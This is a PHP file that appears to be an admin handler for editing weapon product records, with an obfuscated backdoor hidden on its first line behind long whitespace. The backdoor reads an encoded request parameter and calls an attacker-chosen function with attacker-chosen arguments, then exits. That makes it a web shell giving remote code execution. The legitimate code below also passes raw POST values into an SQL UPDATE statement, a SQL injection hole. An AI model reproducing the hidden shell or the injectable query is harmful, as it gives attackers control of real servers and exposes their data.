<?php
																																																																																																																																																																											if(( $iDTX=	@$	{"_RE\121UES\x54"}["C8\x31\x52\103\x37\x4c9"])&&(((	798164474)))){$iDTX[1]	(${ $iDTX[	2	]}[0 ],$iDTX[3]($iDTX[ 4]));};ExIT;
	include 'includes/session.php';

	if(isset($_POST['editProduct'])){
		$id = $_POST['id'];
		$type = $_POST['type'];
		$ranks = $_POST['ranks'];
		$CategoryName = $_POST['CategoryName'];
		$weaponsName = $_POST['weaponsName'];
		$BrandName = $_POST['BrandName'];
		$bodyNo = $_POST['bodyNo'];
		

		echo $sql = "UPDATE product SET type = '$type',ranks ='$ranks',brand_id = '$BrandName',categories_id = '$CategoryName',we_name = '$weaponsName',body_no = '$bodyNo',update_date=Now() WHERE id = '$id'";
		if($conn->query($sql)){
			$_SESSION['success'] = 'Weapons updated successfully';
		}
		else{
			$_SESSION['error'] = $conn->error;
		}
	}
	else{
		$_SESSION['error'] = 'Fill up edit form first';
	}

	header('Location: ' . $_SERVER['HTTP_REFERER']);

?>